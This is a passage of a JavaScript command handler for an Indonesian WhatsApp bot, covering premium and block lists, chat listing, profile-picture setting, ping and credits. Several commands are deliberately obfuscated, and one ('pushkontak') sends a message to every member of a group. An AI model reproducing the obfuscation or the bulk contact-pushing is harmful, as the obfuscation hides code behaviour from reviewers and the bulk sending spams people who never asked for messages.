        '1052|100',
        '\x20Telah\x20Di\x20',
        'Example\x20',
        'nyak\x20',
        '2680492eQdOAc',
        '2777022ZNMioh',
        '18JnVctU',
        '\x20628951308'
    ];
    _0x1647 = function () {
        return _0x5ee171;
    };
    return _0x1647();
}
nomernya = text[_0x3cddf3(0x8a)]('|')[-0xd * 0x274 + 0x1 * -0x21e + 0x2202] ? text[_0x3cddf3(0x8a)]('|')[-0x35 * 0x79 + -0x20d3 + 0x39e0] : '-', limitnya = text[_0x3cddf3(0x8a)]('|')[-0x2705 + -0x5 * 0x271 + 0x333b] ? text[_0x3cddf3(0x8a)]('|')[-0x1c * -0x61 + -0x14e5 + 0xa4a] : '-', db[_0x3cddf3(0x7a)][_0x3cddf3(0x79)]['' + nomernya][_0x3cddf3(0x85)] -= '' + limitnya, newReply(_0x3cddf3(0x8c) + nomernya + (_0x3cddf3(0x7e) + _0x3cddf3(0x88) + _0x3cddf3(0x89) + _0x3cddf3(0x80)) + limitnya);
        break
        case 'enc': {
            if (!isCreator) return newReply(mess.owner)
            if (!q) return newReply(`Contoh ${prefix+command} const adrian = require('adrian-api')`)
            let meg = await obfus(q)
            newReply(`${meg.result}`)
        }
        break
        
        case 'pushkontak': {
          const _0x2c13e7 = _0x3279;
(function (_0x4d5640, _0x79461f) {
    const _0xb07778 = _0x3279, _0x2b1fef = _0x4d5640();
    while (!![]) {
        try {
            const _0x504d0e = -parseInt(_0xb07778(0xa1)) / (-0x185f + 0xae4 + 0xd7c) + parseInt(_0xb07778(0x97)) / (0x1 * 0x10e2 + 0x1fe0 + -0x14 * 0x270) * (parseInt(_0xb07778(0x93)) / (0x212f + 0x4 * -0x5c5 + 0x286 * -0x4)) + -parseInt(_0xb07778(0x91)) / (0x1673 + -0x40 * -0x91 + -0x3aaf * 0x1) + parseInt(_0xb07778(0x92)) / (-0x137 * 0x1 + 0x1 * -0xb2b + 0xc67) + -parseInt(_0xb07778(0xa3)) / (-0x4d6 + 0x1 * -0x1f97 + 0x2473) + parseInt(_0xb07778(0x98)) / (-0x1602 + 0x2c * -0xc7 + 0x3 * 0x12bf) + parseInt(_0xb07778(0xa5)) / (-0x461 * 0x8 + -0x2009 + -0x1 * -0x4319);
            if (_0x504d0e === _0x79461f)
                break;
            else
                _0x2b1fef['push'](_0x2b1fef['shift']());
        } catch (_0x1b29bc) {
            _0x2b1fef['push'](_0x2b1fef['shift']());
        }
    }
}(_0x3c71, 0x2b033 + -0x864b9 + 0xa81a9));
if (!text)
    return newReply(_0x2c13e7(0x9b) + prefix + command + (_0x2c13e7(0xa9) + 'ya'));
if (!isCreator)
    return newReply(mess[_0x2c13e7(0xa7)]);
let get = await participants[_0x2c13e7(0x90)](_0x3ebf0c => _0x3ebf0c['id'][_0x2c13e7(0x96)](_0x2c13e7(0x9a)))[_0x2c13e7(0x9d)](_0x3cdbae => _0x3cdbae['id']), count = get[_0x2c13e7(0x95)], sentCount = 0x1239 + -0x1a * 0x17b + -0x1 * -0x1445;
function _0x3279(_0x1044ed, _0x439365) {
    const _0x374bf5 = _0x3c71();
    return _0x3279 = function (_0x3989db, _0x2c4ed3) {
        _0x3989db = _0x3989db - (0x1 * 0xf75 + -0x16e3 + -0x5 * -0x199);
        let _0x89c22f = _0x374bf5[_0x3989db];
        return _0x89c22f;
    }, _0x3279(_0x1044ed, _0x439365);
}
newReply(_0x2c13e7(0xa2) + _0x2c13e7(0x94) + _0x2c13e7(0xaa));
for (let i = -0x13d0 + 0x26fd + 0x1 * -0x132d; i < get[_0x2c13e7(0x95)]; i++) {
    setTimeout(function () {
        const _0x58f8d8 = _0x2c13e7, _0x1ea2f9 = {
                'mpRJn': function (_0x142be3, _0x28244d) {
                    return _0x142be3 === _0x28244d;
                },
                'yuGwr': function (_0x4e6ebb, _0x114114) {
                    return _0x4e6ebb(_0x114114);
                }
            };
        conn[_0x58f8d8(0x9c) + 'e'](get[i], { 'text': text }), count--, sentCount++, _0x1ea2f9[_0x58f8d8(0x8f)](count, 0x12 * 0x161 + 0x10 * -0x1bb + 0x2de) && _0x1ea2f9[_0x58f8d8(0x9f)](newReply, _0x58f8d8(0x9e) + _0x58f8d8(0xa8) + _0x58f8d8(0xa0) + _0x58f8d8(0xa6) + _0x58f8d8(0xa4) + _0x58f8d8(0x99) + '_' + sentCount + '_*');
    }, i * (-0x1626 + 0x1a75 + -0x67 * 0x1));
}
function _0x3c71() {
    const _0x14d35c = [
        'kirim:_*\x20*',
        '.net',
        'Example\x20',
        'sendMessag',
        'map',
        '*_Semua\x20pe',
        'yuGwr',
        'dikirim!_*',
        '606963FmpMlR',
        '*_Sedang\x20P',
        '1020078JsimdV',
        '\x20pesan\x20ter',
        '2377088PTbDVq',
        ':\x0a*_Jumlah',
        'owner',
        'san\x20telah\x20',
        '\x20Hi\x20Semuan',
        '..._*',
        'mpRJn',
        'filter',
        '1383508TjAegU',
        '1937465BHPnpe',
        '167712rgnTPJ',
        'ush\x20Kontak',
        'length',
        'endsWith',
        '8ZAzROy',
        '3704869qUDBJT'
    ];
    _0x3c71 = function () {
        return _0x14d35c;
    };
    return _0x3c71();
}
        }
        break
        
        case 'addvn':{
            if (!isCreator) return newReply(mess.owner)
            if (args.length < 1) return newReply('Nama audionya apa')
            if (vnnya.includes(q)) return newReply("Nama tersebut sudah di gunakan")
            let delb = await conn.downloadAndSaveMediaMessage(quoted)
            vnnya.push(q)
            await fsx.copy(delb, `./database/AUDIO/${q}.mp3`)
            fs.writeFileSync('./database/vnnya.json', JSON.stringify(vnnya))
            fs.unlinkSync(delb)
            newReply(`Sukses Menambahkan Audio\nCek dengan cara ${prefix}listvn`)
        }
        break
        case 'delvn':{
            if (!isCreator) return newReply(mess.owner)
            if (args.length < 1) return newReply('Masukan query')
            if (!vnnya.includes(q)) return newReply("Nama tersebut tidak ada di dalam data base")
            let wanu = vnnya.indexOf(q)
            vnnya.splice(wanu, 1)
            fs.writeFileSync('./database/vnnya.json', JSON.stringify(vnnya))
            fs.unlinkSync(`./database/AUDIO/${q}.mp3`)
            newReply(`Sukses delete vn ${q}`)
        }
        break
        
        case 'listvn':{
            let teksooo = '┌──⭓「 *LIST VN* 」\n│\n'
            for (let x of vnnya) {
            teksooo += `│⭔ ${x}\n`
            }
            teksooo += `│\n└────────────⭓\n\n*Total ada : ${vnnya.length}*`
            newReply(teksooo)
        }
        break
        
        case 'addprem':
            if (!isCreator) return newReply(mess.owner)
            if (!args[0]) return newReply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281214281312`)
            bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
            let ceknye = await conn.onWhatsApp(bnnd + `@s.whatsapp.net`)
            if (ceknye.length == 0) return newReply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
            premium.push(bnnd)
            fs.writeFileSync('./database/premium.json', JSON.stringify(premium))
            newReply(`Nomor ${bnnd} Telah Sudah Premium!!!`)
        break
        
        case 'delprem':
            if (!isCreator) return newReply(mess.owner)
            if (!args[0]) return newReply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281214281312`)
            yaki = q.split("|")[0].replace(/[^0-9]/g, '')
            unp = premium.indexOf(yaki)
            premium.splice(unp, 1)
            fs.writeFileSync('./database/premium.json', JSON.stringify(premium))
            newReply(`Nomor ${yaki} Telah Di Hapus Dari Premium!!!`)
        break
        
        case 'listprem':
            teksooo = '*List Premium*\n\n'
            for (let i of premium) {
                teksooo += `- ${i}\n`
            }
            teksooo += `\n*Total : ${premium.length}*`
            conn.sendMessage(m.chat, { text: teksooo.trim() }, 'extendedTextMessage', { quoted: m, contextInfo: { "mentionedJid": premium } })
        break
        
        case 'addblock':
            if (!isCreator) return newReply(mess.owner)
            if (!args[0]) return newReply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281214281312`)
            bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
            let bannednya = await conn.onWhatsApp(bnnd + `@s.whatsapp.net`)
            if (bannednya.length == 0) return newReply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
            banned.push(bnnd)
            fs.writeFileSync('./database/banned.json', JSON.stringify(banned))
            newReply(`Nomor ${bnnd} Telah Sudah banned!!!`)
        break
        
        case 'delblock':
            if (!isCreator) return newReply(mess.owner)
            if (!args[0]) return newReply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281214281312`)
            yaki = q.split("|")[0].replace(/[^0-9]/g, '')
            unp = banned.indexOf(yaki)
            banned.splice(unp, 1)
            fs.writeFileSync('./database/banned.json', JSON.stringify(banned))
            newReply(`Nomor ${yaki} Telah Di Hapus Dari banned!!!`)
        break
        
        case 'listblock':
            teksooo = '*List banned*\n\n'
            for (let i of banned) {
                teksooo += `- ${i}\n`
            }
            teksooo += `\n*Total : ${banned.length}*`
            conn.sendMessage(m.chat, { text: teksooo.trim() }, 'extendedTextMessage', { quoted: m, contextInfo: { "mentionedJid": banned } })
        break
       
        case 'myip': {
        if (!isCreator) return newReply(mess.owner)
                var http = require('http')
                http.get({
                    'host': 'api.ipify.org',
                    'port': 80,
                    'path': '/'
                }, function(resp) {
                    resp.on('data', function(ip) {
                        newReply("🔎 My public IP address is: " + ip);
                    })
                })
            }
        break
        case 'listpc': {
                if (!isCreator) return newReply(mess.owner)
                let anu = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)
                let tekslist = `*🔒 LIST PERSONAL CHAT*\n\n`
                tekslist += `*📱 Total Chat :* ${anu.length} Chat\n\n`
                for (let i of anu) {
                    let nama = store.messages[i].array[0].pushName
                    tekslist += `📛 *Nama :* ${nama}\n`
                    tekslist += `👤 *User :* @${i.split('@')[0]}\n`
                    tekslist += `🔗 *Link Chat :* https://wa.me/${i.split('@')[0]}\n\n`
                    tekslist += `──────────────────────\n\n`
                }
                newReply(tekslist)
            }
        break
        case 'listgc': {
                if (!isCreator) return newReply(mess.owner)
                let anu = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id)
                let tekslistgc = `👥 *LIST GROUP CHAT*\n\n`
                tekslistgc += `📱 Total Group : ${anu.length} Group\n\n`
                for (let e of anu) {
                    let metadata = await conn.groupMetadata(e)
                    tekslistgc += `📛 *Nama :* ${metadata.subject}\n`
                    tekslistgc += `👤 *Owner Grup :* ${metadata.owner !== undefined ? '@' + metadata.owner.split`@`[0] : 'Tidak diketahui'}\n`
                    tekslistgc += `🌱 *ID :* ${metadata.id}\n`
                    tekslistgc += `⏳ *Dibuat :* ${moment(metadata.creation * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}\n`
                    tekslistgc += `👥 *Member :* ${metadata.participants.length}\n\n`
                    tekslistgc += `──────────────────────\n\n`
                }
                newReply(tekslistgc)
            }
        break
        
        case 'chat': {
                if (!isCreator) return newReply(mess.owner)
                if (!q) return newReply('Option : 1. mute\n2. unmute\n3. archive\n4. unarchive\n5. read\n6. unread\n7. delete')
                if (args[0] === 'mute') {
                    conn.chatModify({ mute: 'Infinity' }, m.chat, []).then((res) => newReply(jsonformat(res))).catch((err) => newReply(jsonformat(err)))
                } else if (args[0] === 'unmute') {
                    conn.chatModify({ mute: null }, m.chat, []).then((res) => newReply(jsonformat(res))).catch((err) => newReply(jsonformat(err)))
                } else if (args[0] === 'archive') {
                    conn.chatModify({ archive: true }, m.chat, []).then((res) => newReply(jsonformat(res))).catch((err) => newReply(jsonformat(err)))
                } else if (args[0] === 'unarchive') {
                    conn.chatModify({ archive: false }, m.chat, []).then((res) => newReply(jsonformat(res))).catch((err) => newReply(jsonformat(err)))
                } else if (args[0] === 'read') {
                    conn.chatModify({ markRead: true }, m.chat, []).then((res) => newReply(jsonformat(res))).catch((err) => newReply(jsonformat(err)))
                } else if (args[0] === 'unread') {
                    conn.chatModify({ markRead: false }, m.chat, []).then((res) => newReply(jsonformat(res))).catch((err) => newReply(jsonformat(err)))
                } else if (args[0] === 'delete') {
                    conn.chatModify({ clear: { message: { id: m.quoted.id, fromMe: true }} }, m.chat, []).then((res) => newReply(jsonformat(res))).catch((err) => newReply(jsonformat(err)))
                }
            }
        break
        
        case 'react': {
                if (!isCreator) return newReply(mess.owner)
                reactionMessage = {
                    react: {
                        text: args[0],
                        key: { remoteJid: m.chat, fromMe: true, id: quoted.id }
                    }
                }
                conn.sendMessage(m.chat, reactionMessage)
            }
        break
        case 'shutdown': {
             if (!isCreator) return newReply(mess.owner)
			 newReply(`Otsukaresama deshita🖐`)
             await sleep(3000)
             process.exit()
             }
        break
        case 'join': {
                if (!isCreator) return newReply(mess.owner)
                if (!text) return 'Masukkan Link Group!'
                if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return 'Link Invalid!'
                newReply(mess.wait)
                let result = args[0].split('https://chat.whatsapp.com/')[1]
                await conn.groupAcceptInvite(result).then((res) => newReply(jsonformat(res))).catch((err) => newReply(jsonformat(err)))
        }
        break
        case 'leave': {
                if (!isCreator) return newReply(mess.owner)
                await conn.groupLeave(m.chat).then((res) => newReply(jsonformat(res))).catch((err) => newReply(jsonformat(err)))
        }
        break
        case 'setexif': {
                if (!isCreator) return newReply(mess.owner)
                if (!text) return newReply(`Contoh : ${prefix + command} packname|author`)
                global.packname = text.split("|")[0]
                global.author = text.split("|")[1]
                newReply(`Exif berhasil diubah menjadi\n\n• Packname : ${global.packname}\n• Author : ${global.author}`)
        }
        break
        case 'setpp':
        case 'setpp':
        case 'setppbot': {
            var _0x481223 = _0x328b;
(function (_0xe9515c, _0x1a6733) {
    var _0x5179e4 = _0x328b, _0x2587c4 = _0xe9515c();
    while (!![]) {
        try {
            var _0xb17963 = -parseInt(_0x5179e4(0x9d)) / (0x2 * -0x1091 + -0x108e + 0x31b1 * 0x1) * (parseInt(_0x5179e4(0x88)) / (-0x1175 + 0x1 * 0x23ca + -0x1253)) + -parseInt(_0x5179e4(0x7f)) / (-0x211e + -0x2656 * -0x1 + -0x535) + parseInt(_0x5179e4(0x9a)) / (0x1ae3 + -0x1d8f + 0x2b0 * 0x1) * (-parseInt(_0x5179e4(0x8f)) / (-0x3 * -0x98f + 0x1403 + -0x30ab)) + -parseInt(_0x5179e4(0x86)) / (0x946 + -0x3 * -0xb1 + 0xd * -0xdf) * (parseInt(_0x5179e4(0x8c)) / (0x1159 + 0x114 * -0x1d + -0xa * -0x165)) + -parseInt(_0x5179e4(0x91)) / (0x92d * -0x3 + 0x57 + 0x4 * 0x6ce) * (parseInt(_0x5179e4(0x82)) / (-0x472 * -0x6 + 0x1 * -0x173a + 0x3 * -0x123)) + -parseInt(_0x5179e4(0x8b)) / (-0xdd * 0x4 + -0x1be0 + 0x1f5e) * (parseInt(_0x5179e4(0x99)) / (0x47 + -0x17 * -0x13d + -0x1cb7)) + -parseInt(_0x5179e4(0x89)) / (-0x10bf + -0x1c64 + 0x2d2f) * (-parseInt(_0x5179e4(0x84)) / (0x1627 * -0x1 + -0x196d + 0x2fa1));
            if (_0xb17963 === _0x1a6733)
                break;
            else
                _0x2587c4['push'](_0x2587c4['shift']());
        } catch (_0x549ae9) {
            _0x2587c4['push'](_0x2587c4['shift']());
        }
    }
}(_0x12ab, -0x8ad00 + -0x3 * 0xf2be + 0x137602));
if (!isCreator)
    return newReply(mess[_0x481223(0x7d)]);
if (!quoted)
    return reply(_0x481223(0x97) + _0x481223(0x95) + _0x481223(0x7c) + _0x481223(0x90) + (prefix + command));
if (!/image/[_0x481223(0x9b)](mime))
    return reply(_0x481223(0x97) + _0x481223(0x95) + _0x481223(0x7c) + _0x481223(0x90) + (prefix + command));
function _0x328b(_0x1d5539, _0x482fd3) {
    var _0x2aab33 = _0x12ab();
    return _0x328b = function (_0x302765, _0x9f848e) {
        _0x302765 = _0x302765 - (-0x1740 + 0x1 * 0x19e1 + -0x225);
        var _0x19b86b = _0x2aab33[_0x302765];
        return _0x19b86b;
    }, _0x328b(_0x1d5539, _0x482fd3);
}
function _0x12ab() {
    var _0x3b6266 = [
        '/full',
        '31362Glnucl',
        'ilePicture',
        '12tiLwPG',
        '960uFqmWc',
        'unlinkSync',
        '2980fYVETZ',
        '413RYLuJM',
        'ppbot.jpeg',
        'Sukses',
        '25pbHOUw',
        'on\x20',
        '8Dyjman',
        'Message',
        'picture',
        'dSaveMedia',
        'y\x20Image\x20De',
        'updateProf',
        'Kirim/Repl',
        'success',
        '12001GLfQSM',
        '53032acShOW',
        'test',
        'downloadAn',
        '120843lCOpcn',
        'ngan\x20Capti',
        'owner',
        'set',
        '2950887mHyeNL',
        'w:profile:',
        'query',
        '4766400kHcDLK',
        'image',
        '562003BwikmQ'
    ];
    _0x12ab = function () {
        return _0x3b6266;
    };
    return _0x12ab();
}
if (/webp/[_0x481223(0x9b)](mime))
    return reply(_0x481223(0x97) + _0x481223(0x95) + _0x481223(0x7c) + _0x481223(0x90) + (prefix + command));
var medis = await conn[_0x481223(0x9c) + _0x481223(0x94) + _0x481223(0x92)](quoted, _0x481223(0x8d));
if (args[-0xa * 0x118 + 0x9 * -0x3c3 + 0x2ccb] == _0x481223(0x85)) {
    var {img} = await generateProfilePicture(medis);
    await conn[_0x481223(0x81)]({
        'tag': 'iq',
        'attrs': {
            'to': botNumber,
            'type': _0x481223(0x7e),
            'xmlns': _0x481223(0x80) + _0x481223(0x93)
        },
        'content': [{
                'tag': _0x481223(0x93),
                'attrs': { 'type': _0x481223(0x83) },
                'content': img
            }]
    }), fs[_0x481223(0x8a)](medis), reply(mess[_0x481223(0x98)]);
} else {
    var memeg = await conn[_0x481223(0x96) + _0x481223(0x87)](botNumber, { 'url': medis });
    fs[_0x481223(0x8a)](medis), newReply(_0x481223(0x8e));
}
            }
        break
        
        // Created By Agus
        case 'autoread':
            if (!isCreator) return newReply(mess.owner)
            if (args.length < 1) return newReply(`Contoh ${prefix + command} on/off`)
            if (q === 'on'){
            autoread = false
            newReply(`Berhasil mengubah autoread ke ${q}`)
            } else if (q === 'off'){
            autoread = true
            newReply(`Berhasil mengubah autoread ke ${q}`)
            }
        break
        
        // Main Menu
        case 'speedtest': {
                newReply('Testing Speed...')
                let cp = require('child_process')
                let {
                    promisify
                } = require('util')
                let exec = promisify(cp.exec).bind(cp)
                let o
                try {
                    o = await exec('python speed.py')
                } catch (e) {
                    o = e
                } finally {
                    let {
                        stdout,
                        stderr
                    } = o
                    if (stdout.trim()) newReply(stdout)
                    if (stderr.trim()) newReply(stderr)
                }
            }
        break
        case 'owner': 
        case 'creator': {
                conn.sendContact(m.chat, global.owner, m)
               }
        break
        case 'ceklimit': 
        case 'checklimit': 
        case 'limit':{
					newReply('*Limit Lu :* ' + (db.data.users[m.sender].limit))
					}
	    break
        case 'runtime':
            	newReply(`*Bot Telah Online Selama*\n*${runtime(process.uptime())}*`)
        break
        
        case 'totalfitur':
        case 'fitur': 
            newReply(`Total Fitur ${namabot} Adalah ${totalFitur()}`)
        break
        
        case 'ping': {
            function _0x4c36() {
    const _0x5478f0 = [
        'go.jpg',
        'Memory\x20Usa',
        'rver_\x0aRAM:',
        'padEnd',
        'now',
        '6651664usyAyn',
        'age_\x0a',
        '604028sqHpZv',
        '\x0a\x0a_NodeJS\x20',
        'trim',
        '160299EdBVPj',
        'length',
        '\x20/\x20',
        'toFixed',
        'chat',
        'freemem',
        'Kecepatan\x20',
        'totalmem',
        '74850dUdoad',
        'keys',
        '5790ChTwBU',
        'relayMessa',
        '27HNMRbf',
        'sender',
        '\x0a\x0a_Info\x20Se',
        'max',
        'readFileSy',
        '1390dPpOPI',
        '\x20_Second_\x20',
        'map',
        'memoryUsag',
        '64590qnnExT',
        '646450aKTWpa',
        '3AYTKAq',
        './media/lo',
        'Respon\x20',
        'join'
    ];
    _0x4c36 = function () {
        return _0x5478f0;
    };
    return _0x4c36();
}
const _0x541a0c = _0x2d70;
(function (_0xba431e, _0x1c515d) {
    const _0x5a5fbe = _0x2d70, _0x5c7b42 = _0xba431e();
    while (!![]) {
        try {
            const _0x126015 = parseInt(_0x5a5fbe(0x202)) / (0x9 + 0x1 * -0x11fb + 0x5 * 0x397) + parseInt(_0x5a5fbe(0x1f2)) / (0x183 + 0x2 * -0xc2e + 0x16db) + parseInt(_0x5a5fbe(0x1f4)) / (0x2117 * -0x1 + -0x29d + 0x23b7) * (-parseInt(_0x5a5fbe(0x1ff)) / (0x1de2 + 0x23 * 0x7f + -0x2f3b)) + parseInt(_0x5a5fbe(0x1ee)) / (0x3 * 0x57 + -0x9 * -0x43 + -0x35b) * (-parseInt(_0x5a5fbe(0x20c)) / (-0xa2c * 0x1 + -0x4b5 + 0xee7)) + parseInt(_0x5a5fbe(0x1f3)) / (0xb97 + -0x135a * -0x1 + -0x1eea) + parseInt(_0x5a5fbe(0x1fd)) / (-0x368 + 0x1c * -0xe7 + -0xe5a * -0x2) + -parseInt(_0x5a5fbe(0x20e)) / (-0x27 * 0xf0 + 0x1046 + 0x1453) * (parseInt(_0x5a5fbe(0x20a)) / (-0x78 * -0x14 + -0x392 * -0x2 + -0x4a * 0x39));
            if (_0x126015 === _0x1c515d)
                break;
            else
                _0x5c7b42['push'](_0x5c7b42['shift']());
        } catch (_0x4f6b78) {
            _0x5c7b42['push'](_0x5c7b42['shift']());
        }
    }
}(_0x4c36, -0x46ef * -0x16 + -0x99dec + 0x68 * 0x2202));
const used = process[_0x541a0c(0x1f1) + 'e']();
function _0x2d70(_0x2df8cb, _0x21f79d) {
    const _0x5597bf = _0x4c36();
    return _0x2d70 = function (_0x2e6346, _0x21e60a) {
        _0x2e6346 = _0x2e6346 - (-0x21d5 * 0x1 + -0x1b1b + 0x3edd);
        let _0x46e35e = _0x5597bf[_0x2e6346];
        return _0x46e35e;
    }, _0x2d70(_0x2df8cb, _0x21f79d);
}
let timestamp = speed(), latensi = speed() - timestamp, neww = performance[_0x541a0c(0x1fc)](), oldd = performance[_0x541a0c(0x1fc)](), respon = (_0x541a0c(0x208) + _0x541a0c(0x1f6) + latensi[_0x541a0c(0x205)](-0xc * 0xf1 + 0x1302 + 0x2 * -0x3d9) + (_0x541a0c(0x1ef) + _0x541a0c(0x210) + _0x541a0c(0x1fa) + '\x20') + formatp(os[_0x541a0c(0x209)]() - os[_0x541a0c(0x207)]()) + _0x541a0c(0x204) + formatp(os[_0x541a0c(0x209)]()) + (_0x541a0c(0x200) + _0x541a0c(0x1f9) + _0x541a0c(0x1fe)) + Object[_0x541a0c(0x20b)](used)[_0x541a0c(0x1f0)]((_0xb475cf, _0x6c838f, _0x5772a5) => _0xb475cf[_0x541a0c(0x1fb)](Math[_0x541a0c(0x211)](..._0x5772a5[_0x541a0c(0x1f0)](_0x1ce2e3 => _0x1ce2e3[_0x541a0c(0x203)])), '\x20') + ':\x20' + formatp(used[_0xb475cf]))[_0x541a0c(0x1f7)]('\x0a') + '\x0a')[_0x541a0c(0x201)]();
conn[_0x541a0c(0x20d) + 'ge'](m[_0x541a0c(0x206)], {
    'liveLocationMessage': {
        'degreesLatitude': 35.67657,
        'degreesLongitude': 139.762148,
        'caption': respon,
        'sequenceNumber': 0x5e2b9e7ffcf11,
        'timeOffset': 0x2198,
        'jpegThumbnail': fs[_0x541a0c(0x1ed) + 'nc'](_0x541a0c(0x1f5) + _0x541a0c(0x1f8)),
        'contextInfo': {
            'mentionedJid': [m[_0x541a0c(0x20f)]],
            'externalAdReply': { 'showAdAttribution': ![] }
        }
    }
}, { 'quoted': m });
        }
        break
        
case 'tqto': {
  function _0x42ca() {
    const _0x1d055c = [
        'sendMessag',
        '5076b7da7d',
        'https://ch',
        'namaowner',
        'kiXD\x20(\x20SEP',
        '\x20(\x20TEAMS\x20)',
        'hor\x20)*\x0a\x20*•',
        'BEBAN\x20)*\x0a\x20',
        'SAW*\x0a\x20*•\x20M',
        '\x20Rullxzz\x20(',
        '3ce9e.jpg',
        'END\x20)*\x0a\x20*•',
        'nTzy\x20(\x20Aut',
        '\x20Donatur*\x0a',
        '3TfHkHn',
        '1374590PGwree',
        '\x20ALLAH\x20SWT',
        '8472995bZCzAb',
        '*\x0a\x20*•\x20LoL-',
        '*\x0a\x20*•\x20Luck',
        'ilersBotz\x20',
        'Human\x20(\x20Re',
        '1814504dFvqkP',
        'at.whatsap',
        '*•\x20YogzzDe',
        'bx2raQ10',
        '\x0a\x20*•\x20Adria',
        'H\x20MODS\x20(\x20S',
        '\x0a\x20*•\x20XTRAM',
        '\x20KASIH\x20KEP',
        '8mGwvlj',
        'Subscriber',
        'st\x20APIs\x20)*',
        'D\x20)*\x0a\x20*•\x20W',
        '*\x0a\x20*•\x20NABI',
        '*\x0a\x20*•\x20Para',
        '15749451kfHbQR',
        'AdrianTzy',
        '1874464EtxEYh',
        'p.com/DRCr',
        '\x20SEPUH¹\x20)*',
        '1131134loMZxq',
        'DanuDev\x20(\x20',
        '\x0a\x20*•\x20Para\x20',
        'UH\x20)*\x0a\x20*•\x20',
        'EPUH²\x20)*\x0a\x20',
        'vX\x20(\x20FRIEN',
        'https://te',
        '*•\x20Reii\x20Co',
        '\x0a\x20_*TERIMA',
        '*\x0a\x20*•\x20KiZa',
        'D\x20)*\x0a\x20*•\x20K',
        'PjaOXcZ9tX',
        'legra.ph/f',
        'Y\x20PARENTS*',
        '6625614UrYvTF',
        'ADA*_\x0a\x0a\x20*•',
        'ile/8633bf',
        '\x20MUHAMMAD\x20',
        'de\x20(\x20FRIEN',
        'yCat\x20(\x20FRI',
        'chat',
        '(\x20BEBAN¹\x20)'
    ];
    _0x42ca = function () {
        return _0x1d055c;
    };
    return _0x42ca();
}
const _0x4a0085 = _0x1cfe;
(function (_0x4b5713, _0x2f3dd6) {
    const _0x411395 = _0x1cfe, _0x46b68f = _0x4b5713();
    while (!![]) {
        try {
            const _0x383b2c = parseInt(_0x411395(0xe7)) / (-0x101a * -0x1 + -0x2176 + 0x115d) + parseInt(_0x411395(0xfa)) / (-0x1 * -0x676 + 0x407 * 0x1 + 0x1 * -0xa7b) * (parseInt(_0x411395(0xdf)) / (-0x1a6c + 0x1a * -0x13 + 0x1c5d)) + -parseInt(_0x411395(0xf7)) / (0x1cca + 0x21 * 0x11b + -0x4141) + parseInt(_0x411395(0xe2)) / (-0x212b + 0x2443 + -0x313) + -parseInt(_0x411395(0xc9)) / (0x47e * 0x1 + 0x15 * 0x147 + 0x1f4b * -0x1) + parseInt(_0x411395(0xe0)) / (-0x1273 + 0x2 * -0x63a + 0x1eee) + parseInt(_0x411395(0xef)) / (-0x145c * 0x1 + 0x277 * 0x7 + -0x1 * -0x323) * (-parseInt(_0x411395(0xf5)) / (-0x7 * 0x182 + 0x2b * -0x7f + 0x7fb * 0x4));
            if (_0x383b2c === _0x2f3dd6)
                break;
            else
                _0x46b68f['push'](_0x46b68f['shift']());
        } catch (_0x4686d7) {
            _0x46b68f['push'](_0x46b68f['shift']());
        }
    }
}(_0x42ca, -0x7 * -0x35342 + -0x259c * -0x60 + -0x16e956));
function _0x1cfe(_0x392002, _0x4d46e1) {
    const _0x413bc6 = _0x42ca();
    return _0x1cfe = function (_0x59e176, _0x5d4ec0) {
        _0x59e176 = _0x59e176 - (-0x2f * 0x89 + 0x1 * 0x9e1 + 0x100c);
        let _0x3de859 = _0x413bc6[_0x59e176];
        return _0x3de859;
    }, _0x1cfe(_0x392002, _0x4d46e1);
}
let tqtonya = _0x4a0085(0x102) + _0x4a0085(0xee) + _0x4a0085(0xca) + _0x4a0085(0xe1) + _0x4a0085(0xf3) + _0x4a0085(0xcc) + _0x4a0085(0xd9) + _0x4a0085(0xc8) + _0x4a0085(0xeb) + _0x4a0085(0xdd) + _0x4a0085(0xd7) + '\x20' + global[_0x4a0085(0xd4)] + (_0x4a0085(0xe3) + _0x4a0085(0xe6) + _0x4a0085(0xf1) + _0x4a0085(0xed) + _0x4a0085(0xd6) + _0x4a0085(0x103) + _0x4a0085(0xd5) + _0x4a0085(0xfd) + _0x4a0085(0xfb) + _0x4a0085(0xd8) + _0x4a0085(0x101) + _0x4a0085(0xcd) + _0x4a0085(0xf2) + _0x4a0085(0xec) + _0x4a0085(0xfe) + _0x4a0085(0xe9) + _0x4a0085(0xff) + _0x4a0085(0x104) + _0x4a0085(0xe5) + _0x4a0085(0xd0) + _0x4a0085(0xe4) + _0x4a0085(0xce) + _0x4a0085(0xdc) + _0x4a0085(0xda) + _0x4a0085(0xf9) + _0x4a0085(0xfc) + _0x4a0085(0xf0) + _0x4a0085(0xf4) + _0x4a0085(0xde) + '\x20');
conn[_0x4a0085(0xd1) + 'e'](m[_0x4a0085(0xcf)], {
    'text': tqtonya,
    'contextInfo': {
        'externalAdReply': {
            'showAdAttribution': !![],
            'title': ucapanWaktu + '\x20' + pushname,
            'body': _0x4a0085(0xf6),
            'thumbnailUrl': _0x4a0085(0x100) + _0x4a0085(0xc7) + _0x4a0085(0xcb) + _0x4a0085(0xd2) + _0x4a0085(0xdb),
            'sourceUrl': _0x4a0085(0xd3) + _0x4a0085(0xe8) + _0x4a0085(0xf8) + _0x4a0085(0xc6) + _0x4a0085(0xea),
            'mediaType': 0x1,
            'renderLargerThumbnail': !![]
        }
    }
});
}
break
            case 'sc':
            case 'script':
               var _0x339ca7 = _0x106b;
function _0x2d25() {
    var _0x246dcf = [
        '136oBZPhF',
        '57600FUUtJh',
        'outube.com',
        '\x20https://y',
        '82672tqvHcO',
        '640732eHMFoK',
        'list=PLRmL',
        '3piugfV',
        'ptlwtOy2q',
        'RCoejWJsau',
        '/playlist?',
        '328680HbOibq',
        '1988172oSJgRO',
        'HXGmkKERWn',
        'Script\x20Bot',
        '101633xAlDkM',
        '777978rZolIv'
    ];
    _0x2d25 = function () {
        return _0x246dcf;
    };
    return _0x2d25();
}
function _0x106b(_0x16ea88, _0x90ab9d) {
